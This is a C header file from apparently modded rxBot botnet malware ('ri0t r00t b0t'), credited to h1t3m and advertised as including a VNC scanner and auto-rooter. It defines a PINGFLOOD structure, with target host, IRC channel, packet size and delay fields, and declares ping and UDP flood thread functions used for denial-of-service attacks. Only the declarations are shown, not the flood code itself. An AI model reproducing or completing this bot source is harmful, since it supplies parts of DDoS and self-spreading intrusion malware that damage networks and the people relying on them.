/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/


#if !defined NO_PING && !defined NO_UDP
 // ping/udp structure.
typedef struct PINGFLOOD 
{
	SOCKET sock;
	char host[MAXHOSTNAME];
	char chan[MAXCHANLEN];
	int num;
	int size;
	int delay;
	unsigned short port;
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} PINGFLOOD;
#endif

#ifndef NO_PING
DWORD WINAPI ping(LPVOID param);
#endif

#ifndef NO_UDP
DWORD WINAPI udp(LPVOID param);
#endif

